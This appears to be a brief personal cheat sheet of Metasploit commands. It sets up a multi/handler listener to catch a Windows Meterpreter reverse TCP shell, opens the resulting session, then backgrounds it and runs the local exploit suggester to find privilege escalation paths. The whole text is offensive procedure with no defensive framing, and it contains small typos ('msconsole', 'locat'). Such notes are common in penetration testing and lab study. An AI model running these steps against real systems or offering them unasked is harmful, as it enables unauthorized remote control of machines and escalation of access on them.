### start listener
```bash
msconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <IP>
run
```

### access the session created
`sessions -i 1`

### Search and Select locat exploit for priv escalation
```bash
background 

use post/multi/recon/local_exploit_suggester
set SESSION {}

run

```

